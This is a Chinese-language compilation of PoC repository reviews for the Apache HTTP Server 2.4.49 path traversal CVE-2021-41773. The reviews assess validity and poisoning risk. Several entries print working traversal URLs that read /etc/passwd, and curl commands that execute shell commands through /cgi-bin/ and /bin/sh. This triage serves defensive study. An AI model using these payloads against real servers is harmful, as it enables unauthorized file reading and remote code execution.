**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

